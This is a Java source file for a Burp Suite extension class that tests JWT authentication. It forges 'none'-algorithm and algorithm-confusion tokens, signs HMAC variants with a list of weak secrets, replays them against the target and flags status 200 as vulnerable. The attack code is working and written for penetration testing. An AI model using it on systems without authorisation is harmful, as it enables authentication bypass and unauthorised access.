import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.border.TitledBorder;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Base64;
import java.util.List;
import java.util.ArrayList;

/**
 * AttackTools provides JWT-specific attack modules including:
 * - None algorithm attack
 * - Algorithm confusion attack
 * - Signature manipulation tests
 * 
 * This class follows the existing UI patterns from the JWT extension
 * and integrates with Burp's request/response editors.
 */
public class AttackTools {
    private MontoyaApi api;
    private HttpRequestResponse currentRequestResponse;
    private HttpRequestEditor requestEditor;
    private HttpResponseEditor responseEditor;
    private JTextArea resultsArea;
    private JButton testNoneButton;
    private JButton algorithmConfusionButton;
    private JLabel statusLabel;
    private String originalJWT;
    private boolean hasJWT;
    private JPanel requestPanel;
    private JPanel responsePanel;
    
    public AttackTools(MontoyaApi api) {
        this.api = api;
        this.hasJWT = false;
    }
    
    /**
     * Create the main UI panel for Attack Tools
     * @return JPanel containing the attack tools interface
     */
    public JPanel getUI() {
        JPanel mainPanel = new JPanel(new BorderLayout());
        mainPanel.setBorder(new EmptyBorder(10, 10, 10, 10));
        
        // Create top panel with instructions and status
        JPanel topPanel = createTopPanel();
        mainPanel.add(topPanel, BorderLayout.NORTH);
        
        // Create main split pane for center and bottom panels
        JSplitPane mainSplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        mainSplitPane.setResizeWeight(0.4); // Give more space to the bottom panel (Attack Results)
        mainSplitPane.setOneTouchExpandable(true); // Add expand/collapse buttons
        mainSplitPane.setContinuousLayout(true); // Smooth resizing
        
        // Create center panel with request/response editors
        JPanel centerPanel = createCenterPanel();
        centerPanel.setMinimumSize(new Dimension(400, 200)); // Minimum size
        mainSplitPane.setTopComponent(centerPanel);
        
        // Create bottom panel with attack buttons and results
        JPanel bottomPanel = createBottomPanel();
        bottomPanel.setMinimumSize(new Dimension(400, 200)); // Increased minimum size
        mainSplitPane.setBottomComponent(bottomPanel);
        
        mainPanel.add(mainSplitPane, BorderLayout.CENTER);
        
        // Initialize editors
        initializeEditors();
        
        // Set initial divider location after UI is built
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                mainSplitPane.setDividerLocation(0.4); // 40% for top, 60% for bottom
            }
        });
        
        return mainPanel;
    }
    
    /**
     * Create the top instruction panel
     */
    private JPanel createTopPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        
        // Instructions
        JLabel instructionLabel = new JLabel("<html><b>Test JWT tokens with different algorithms:</b><br>" +
                "Send a request containing a JWT token via right-click 'Send to Attack Tools' to begin testing.</html>");
        instructionLabel.setBorder(new EmptyBorder(5, 5, 10, 5));
        panel.add(instructionLabel, BorderLayout.NORTH);
        
        // Status
        statusLabel = new JLabel("No JWT token loaded. Send a request with a JWT to begin testing.");
        ThemeManager.styleStatusLabel(statusLabel, "normal");
        statusLabel.setBorder(new EmptyBorder(0, 5, 5, 5));
        panel.add(statusLabel, BorderLayout.CENTER);
        
        return panel;
    }
    
    /**
     * Create the center panel with request/response editors
     */
    private JPanel createCenterPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        
        // Create request/response panel with proper resizing
        JSplitPane splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        splitPane.setResizeWeight(0.5); // Equal space distribution
        splitPane.setOneTouchExpandable(true); // Add expand/collapse buttons
        splitPane.setContinuousLayout(true); // Smooth resizing
        
        // Request panel
        requestPanel = new JPanel(new BorderLayout());
        requestPanel.setBorder(new TitledBorder("HTTP Request"));
        requestPanel.setMinimumSize(new Dimension(200, 200)); // Minimum size
        requestPanel.setPreferredSize(new Dimension(400, 300));
        splitPane.setLeftComponent(requestPanel);
        
        // Response panel  
        responsePanel = new JPanel(new BorderLayout());
        responsePanel.setBorder(new TitledBorder("HTTP Response"));
        responsePanel.setMinimumSize(new Dimension(200, 200)); // Minimum size
        responsePanel.setPreferredSize(new Dimension(400, 300));
        splitPane.setRightComponent(responsePanel);
        
        panel.add(splitPane, BorderLayout.CENTER);
        
        return panel;
    }
    
    /**
     * Create the bottom panel with attack buttons and results
     */
    private JPanel createBottomPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        
        // Attack buttons panel at the top
        JPanel buttonPanel = createButtonPanel();
        panel.add(buttonPanel, BorderLayout.NORTH);
        
        // Results panel in the center (will expand)
        JPanel resultsPanel = createResultsPanel();
        panel.add(resultsPanel, BorderLayout.CENTER);
        
        return panel;
    }
    
    /**
     * Create the attack buttons panel
     */
    private JPanel createButtonPanel() {
        JPanel panel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        panel.setBorder(new TitledBorder("Attack Tests"));
        
        // Test 'none' Algorithm button
        testNoneButton = new JButton("Test 'none' Algorithm");
        testNoneButton.setToolTipText("Test if the token accepts 'none' algorithm without signature verification");
        testNoneButton.setEnabled(false);
        testNoneButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                performNoneAlgorithmAttack();
            }
        });
        panel.add(testNoneButton);
        
        // Algorithm Confusion button
        algorithmConfusionButton = new JButton("Algorithm Confusion");
        algorithmConfusionButton.setToolTipText("Test algorithm confusion attacks (RS256 to HS256)");
        algorithmConfusionButton.setEnabled(false);
        algorithmConfusionButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                performAlgorithmConfusionAttack();
            }
        });
        panel.add(algorithmConfusionButton);
        
        return panel;
    }
    
    /**
     * Create the results panel
     */
    private JPanel createResultsPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(new TitledBorder("Attack Results"));
        
        resultsArea = new JTextArea(8, 80);
        resultsArea.setEditable(false);
        ThemeManager.styleMonospaceTextArea(resultsArea);
        resultsArea.setFont(ThemeManager.getMonospaceFont().deriveFont(14f)); // Increased font size
        resultsArea.setText("Attack results will appear here...");
        resultsArea.setLineWrap(true); // Enable line wrapping
        resultsArea.setWrapStyleWord(true); // Wrap at word boundaries
        
        JScrollPane scrollPane = new JScrollPane(resultsArea);
        scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
        scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        scrollPane.setMinimumSize(new Dimension(400, 150)); // Increased minimum height
        scrollPane.setPreferredSize(new Dimension(800, 300)); // Increased preferred height
        
        panel.add(scrollPane, BorderLayout.CENTER);
        
        return panel;
    }
    
    /**
     * Initialize the request/response editors
     */
    private void initializeEditors() {
        try {
            // Create the editors (will be added to panels when request is loaded)
            requestEditor = api.userInterface().createHttpRequestEditor();
            responseEditor = api.userInterface().createHttpResponseEditor();
        } catch (Exception e) {
            api.logging().logToError("Failed to initialize editors: " + e.getMessage());
            appendResult("ERROR: Failed to initialize request/response editors: " + e.getMessage());
        }
    }
    
    /**
     * Process a request sent from context menu - public method for external access
     * @param requestResponse The HTTP request/response to process
     */
    public void processRequest(HttpRequestResponse requestResponse) {
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                try {
                    api.logging().logToOutput("Attack Tools: processRequest called from context menu");
                    updateRequestResponse(requestResponse);
                } catch (Exception e) {
                    api.logging().logToError("Error in Attack Tools processRequest: " + e.getMessage());
                    appendResult("ERROR: Failed to process request: " + e.getMessage());
                }
            }
        });
    }
    
    /**
     * Update the UI with a new request/response
     * @param requestResponse The HTTP request/response to display
     */
    public void updateRequestResponse(HttpRequestResponse requestResponse) {
        this.currentRequestResponse = requestResponse;
        
        try {
            // Update editors
            if (requestEditor != null) {
                requestEditor.setRequest(requestResponse.request());
                
                // Add editor to request panel
                if (requestPanel != null) {
                    requestPanel.removeAll();
                    requestPanel.setBorder(new TitledBorder("HTTP Request"));
                    requestPanel.add(requestEditor.uiComponent(), BorderLayout.CENTER);
                    requestPanel.revalidate();
                    requestPanel.repaint();
                }
            }
            
            if (responseEditor != null && requestResponse.response() != null) {
                responseEditor.setResponse(requestResponse.response());
                
                // Add editor to response panel
                if (responsePanel != null) {
                    responsePanel.removeAll();
                    responsePanel.setBorder(new TitledBorder("HTTP Response"));
                    responsePanel.add(responseEditor.uiComponent(), BorderLayout.CENTER);
                    responsePanel.revalidate();
                    responsePanel.repaint();
                }
            }
            
            // Extract and analyze JWT
            extractJWTFromRequest(requestResponse.request());
            
        } catch (Exception e) {
            api.logging().logToError("Error updating request/response: " + e.getMessage());
            appendResult("ERROR: Failed to update request/response viewers: " + e.getMessage());
        }
    }
    

    
    /**
     * Extract JWT token from the HTTP request
     * @param request HTTP request to analyze
     */
    private void extractJWTFromRequest(HttpRequest request) {
        try {
            String requestString = request.toString();
            List<String> foundTokens = JWTTools.extractJWTFromText(requestString, "REQUEST");
            
            if (!foundTokens.isEmpty()) {
                originalJWT = foundTokens.get(0);
                hasJWT = true;
                testNoneButton.setEnabled(true);
                algorithmConfusionButton.setEnabled(true);
                statusLabel.setText("JWT token found and loaded. Ready for attack testing.");
                ThemeManager.styleStatusLabel(statusLabel, "success");
                
                appendResult("=== JWT Token Analysis ===");
                appendResult("Original JWT found: " + originalJWT.substring(0, Math.min(50, originalJWT.length())) + "...");
                
                // Analyze the JWT
                analyzeJWT(originalJWT);
                
            } else {
                hasJWT = false;
                testNoneButton.setEnabled(false);
                algorithmConfusionButton.setEnabled(false);
                statusLabel.setText("No JWT token found in the request. Please send a request containing a JWT token.");
                ThemeManager.styleStatusLabel(statusLabel, "error");
                
                appendResult("No JWT token found in the request.");
                appendResult("Please send a request containing a JWT token via right-click 'Send to Attack Tools'.");
            }
            
        } catch (Exception e) {
            api.logging().logToError("Error extracting JWT: " + e.getMessage());
            appendResult("ERROR: Failed to extract JWT from request: " + e.getMessage());
        }
    }
    
    /**
     * Analyze the JWT token and display information
     * @param jwt JWT token to analyze
     */
    private void analyzeJWT(String jwt) {
        try {
            String[] parts = jwt.split("\\.");
            if (parts.length >= 2) {
                // Decode header
                String header = parts[0];
                while (header.length() % 4 != 0) {
                    header += "=";
                }
                byte[] headerBytes = Base64.getUrlDecoder().decode(header);
                String decodedHeader = new String(headerBytes);
                
                appendResult("JWT Header: " + decodedHeader);
                
                // Extract algorithm
                String algorithm = extractAlgorithm(decodedHeader);
                if (algorithm != null) {
                    appendResult("Current Algorithm: " + algorithm);
                    
                    // Provide attack recommendations
                    if ("none".equalsIgnoreCase(algorithm)) {
                        appendResult("⚠️  Token already uses 'none' algorithm - no signature verification!");
                    } else if (algorithm.startsWith("RS") || algorithm.startsWith("ES")) {
                        appendResult("💡 Algorithm confusion attack possible: " + algorithm + " → HS256");
                    } else if (algorithm.startsWith("HS")) {
                        appendResult("💡 Token uses HMAC - test 'none' algorithm attack");
                    }
                }
                
                // Decode payload for additional info
                if (parts.length >= 2) {
                    String payload = parts[1];
                    while (payload.length() % 4 != 0) {
                        payload += "=";
                    }
                    byte[] payloadBytes = Base64.getUrlDecoder().decode(payload);
                    String decodedPayload = new String(payloadBytes);
                    
                    appendResult("JWT Payload: " + decodedPayload);
                }
                
                appendResult("Ready to perform attacks. Click the attack buttons above.");
            }
            
        } catch (Exception e) {
            appendResult("Warning: Could not fully analyze JWT: " + e.getMessage());
        }
    }
    
    /**
     * Extract algorithm from JWT header
     * @param headerJson JWT header JSON
     * @return Algorithm string or null
     */
    private String extractAlgorithm(String headerJson) {
        try {
            // Simple regex to extract algorithm
            java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("\"alg\"\\s*:\\s*\"([^\"]+)\"");
            java.util.regex.Matcher matcher = pattern.matcher(headerJson);
            
            if (matcher.find()) {
                return matcher.group(1);
            }
        } catch (Exception e) {
            // Ignore
        }
        return null;
    }
    
    /**
     * Perform the 'none' algorithm attack
     */
    private void performNoneAlgorithmAttack() {
        if (!hasJWT || originalJWT == null) {
            appendResult("ERROR: No JWT token available for testing.");
            return;
        }
        
        appendResult("\n=== Testing 'none' Algorithm Attack ===");
        
        try {
            // Create modified JWT with 'none' algorithm
            String[] parts = originalJWT.split("\\.");
            if (parts.length < 2) {
                appendResult("ERROR: Invalid JWT format");
                return;
            }
            
            // Create new header with 'none' algorithm
            String newHeader = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
            String encodedHeader = Base64.getUrlEncoder().withoutPadding().encodeToString(newHeader.getBytes());
            
            // Keep original payload
            String payload = parts[1];
            
            // Create JWT without signature (none algorithm)
            String noneJWT = encodedHeader + "." + payload + ".";
            
            appendResult("Original JWT: " + originalJWT.substring(0, Math.min(80, originalJWT.length())) + "...");
            appendResult("Modified JWT: " + noneJWT.substring(0, Math.min(80, noneJWT.length())) + "...");
            appendResult("Changes made:");
            appendResult("  - Algorithm changed to 'none'");
            appendResult("  - Signature removed");
            
            // Send the modified request
            sendModifiedRequest(noneJWT, "'none' Algorithm");
            
        } catch (Exception e) {
            appendResult("ERROR: Failed to perform 'none' algorithm attack: " + e.getMessage());
            api.logging().logToError("None algorithm attack failed: " + e.getMessage());
        }
    }
    
    /**
     * Perform the algorithm confusion attack
     */
    private void performAlgorithmConfusionAttack() {
        if (!hasJWT || originalJWT == null) {
            appendResult("ERROR: No JWT token available for testing.");
            return;
        }
        
        appendResult("\n=== Testing Algorithm Confusion Attack ===");
        
        try {
            String[] parts = originalJWT.split("\\.");
            if (parts.length < 2) {
                appendResult("ERROR: Invalid JWT format");
                return;
            }
            
            // Decode original header to check current algorithm
            String headerB64 = parts[0];
            while (headerB64.length() % 4 != 0) {
                headerB64 += "=";
            }
            byte[] headerBytes = Base64.getUrlDecoder().decode(headerB64);
            String originalHeader = new String(headerBytes);
            String currentAlg = extractAlgorithm(originalHeader);
            
            appendResult("Current algorithm: " + currentAlg);
            
            if (currentAlg == null) {
                appendResult("ERROR: Could not determine current algorithm");
                return;
            }
            
            // Perform different confusion attacks based on current algorithm
            List<String> attackVariants = new ArrayList<String>();
            
            if (currentAlg.startsWith("RS") || currentAlg.startsWith("ES")) {
                // RSA/ECDSA to HMAC confusion
                attackVariants.add("HS256");
                attackVariants.add("HS384");
                attackVariants.add("HS512");
                appendResult("Testing asymmetric to symmetric algorithm confusion...");
            } else if (currentAlg.startsWith("HS")) {
                // HMAC confusion variations
                attackVariants.add("RS256");
                attackVariants.add("ES256");
                appendResult("Testing symmetric to asymmetric algorithm confusion...");
            }
            
            // Also test case variations
            attackVariants.add(currentAlg.toLowerCase());
            attackVariants.add(currentAlg.toUpperCase());
            
            for (String newAlg : attackVariants) {
                if (!newAlg.equals(currentAlg)) {
                    testAlgorithmVariant(newAlg, parts[1]);
                }
            }
            
        } catch (Exception e) {
            appendResult("ERROR: Failed to perform algorithm confusion attack: " + e.getMessage());
            api.logging().logToError("Algorithm confusion attack failed: " + e.getMessage());
        }
    }
    
    /**
     * Test a specific algorithm variant
     * @param algorithm Algorithm to test
     * @param payload Original payload
     */
    private void testAlgorithmVariant(String algorithm, String payload) {
        try {
            // Create new header with modified algorithm
            String newHeader = "{\"alg\":\"" + algorithm + "\",\"typ\":\"JWT\"}";
            String encodedHeader = Base64.getUrlEncoder().withoutPadding().encodeToString(newHeader.getBytes());
            
            // For HMAC algorithms, try to create a valid signature using the public key as secret
            String modifiedJWT;
            if (algorithm.startsWith("HS")) {
                // Try common weak secrets for HMAC
                String[] weakSecrets = {"secret", "key", "password", "123456", "", "null"};
                
                for (String secret : weakSecrets) {
                    try {
                        String signature = JWTUtils.calculateHMACSignature(
                            encodedHeader + "." + payload, secret, algorithm);
                        modifiedJWT = encodedHeader + "." + payload + "." + signature;
                        
                        appendResult("Testing " + algorithm + " with secret '" + secret + "':");
                        appendResult("  Modified JWT: " + modifiedJWT.substring(0, Math.min(80, modifiedJWT.length())) + "...");
                        
                        sendModifiedRequest(modifiedJWT, "Algorithm Confusion (" + algorithm + " with '" + secret + "')");
                        
                    } catch (Exception e) {
                        // Try next secret
                    }
                }
            } else {
                // For RSA/ECDSA, just remove signature
                modifiedJWT = encodedHeader + "." + payload + ".";
                appendResult("Testing " + algorithm + " without signature:");
                appendResult("  Modified JWT: " + modifiedJWT.substring(0, Math.min(80, modifiedJWT.length())) + "...");
                
                sendModifiedRequest(modifiedJWT, "Algorithm Confusion (" + algorithm + ")");
            }
            
        } catch (Exception e) {
            appendResult("  Failed to test " + algorithm + ": " + e.getMessage());
        }
    }
    
    /**
     * Send a modified request with the new JWT
     * @param modifiedJWT Modified JWT token
     * @param attackType Type of attack being performed
     */
    private void sendModifiedRequest(String modifiedJWT, String attackType) {
        if (currentRequestResponse == null) {
            appendResult("ERROR: No request available to modify");
            return;
        }
        
        try {
            // Get original request
            HttpRequest originalRequest = currentRequestResponse.request();
            
            // Replace the JWT in the Authorization header
            HttpRequest modifiedRequest = originalRequest.withUpdatedHeader("Authorization", "Bearer " + modifiedJWT);
            
            appendResult("Sending " + attackType + " request...");
            
            // Send request in background thread to avoid blocking UI
            Thread requestThread = new Thread(new Runnable() {
                public void run() {
                    try {
                        HttpRequestResponse response = api.http().sendRequest(modifiedRequest);
                        
                        SwingUtilities.invokeLater(new Runnable() {
                            public void run() {
                                handleAttackResponse(response, attackType);
                            }
                        });
                        
                    } catch (Exception e) {
                        SwingUtilities.invokeLater(new Runnable() {
                            public void run() {
                                appendResult("ERROR: Request failed - " + e.getMessage());
                                api.logging().logToError("Attack request failed: " + e.getMessage());
                            }
                        });
                    }
                }
            });
            
            requestThread.start();
            
        } catch (Exception e) {
            appendResult("ERROR: Failed to send modified request: " + e.getMessage());
            api.logging().logToError("Failed to send modified request: " + e.getMessage());
        }
    }
    
    /**
     * Handle the response from an attack request
     * @param response HTTP response
     * @param attackType Type of attack performed
     */
    private void handleAttackResponse(HttpRequestResponse response, String attackType) {
        try {
            if (response.response() != null) {
                int statusCode = response.response().statusCode();
                appendResult("Response Status: " + statusCode);
                
                // Analyze the response
                if (statusCode == 200) {
                    appendResult("🚨 VULNERABLE: " + attackType + " was accepted! (Status 200)");
                    appendResult("   This indicates a serious security vulnerability.");
                } else if (statusCode == 401 || statusCode == 403) {
                    appendResult("✅ SECURE: " + attackType + " was rejected (Status " + statusCode + ")");
                } else {
                    appendResult("⚠️  UNCLEAR: " + attackType + " returned status " + statusCode);
                    appendResult("   Manual analysis may be required.");
                }
                
                // Update response editor if possible
                if (responseEditor != null) {
                    responseEditor.setResponse(response.response());
                }
                
            } else {
                appendResult("ERROR: No response received for " + attackType);
            }
            
        } catch (Exception e) {
            appendResult("ERROR: Failed to analyze response: " + e.getMessage());
        }
    }
    
    /**
     * Append text to the results area
     * @param text Text to append
     */
    private void appendResult(String text) {
        if (resultsArea != null) {
            SwingUtilities.invokeLater(new Runnable() {
                public void run() {
                    if (resultsArea.getText().equals("Attack results will appear here...")) {
                        resultsArea.setText(text);
                    } else {
                        resultsArea.append("\n" + text);
                    }
                    resultsArea.setCaretPosition(resultsArea.getDocument().getLength());
                }
            });
        }
    }
    
    /**
     * Clean up resources for proper extension unloading
     */
    public void cleanup() {
        // Clear any stored data
        currentRequestResponse = null;
        originalJWT = null;
        hasJWT = false;
        
        // Clear UI components
        if (resultsArea != null) {
            SwingUtilities.invokeLater(() -> {
                resultsArea.setText("Attack results will appear here...");
            });
        }
        
        api.logging().logToOutput("AttackTools cleanup completed");
    }

}